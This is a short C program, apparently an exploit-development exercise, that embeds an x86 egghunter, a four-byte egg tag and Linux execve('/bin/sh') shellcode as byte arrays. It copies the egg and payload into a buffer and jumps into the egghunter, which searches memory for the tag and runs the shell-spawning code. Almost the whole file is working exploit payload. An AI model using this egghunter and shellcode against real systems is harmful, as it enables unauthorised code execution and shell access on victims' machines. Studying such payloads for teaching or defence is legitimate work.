#include<stdio.h>
#include<string.h>

// mov ebx, 0x44556677	; our egg :)

unsigned char egghunter[] = \
"\xbb\x77\x66\x55\x44\x89\xe0\x40\x39\x18\x75\xfb\x40\xff\xe0"
;

unsigned char egg[] = \
"\x77\x66\x55\x44";

// Place your shellcode here
unsigned char code[] = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
;



int main()
{
char finale[128];
memcpy(finale, egg, strlen(egg));
memcpy(finale+4, code, strlen(code));
printf("Shellcode Length:  %d\n", strlen(finale));
printf("eggHunter Length:  %d\n", strlen(egghunter));

int (*ret)() = (int(*)())egghunter;
ret();
}
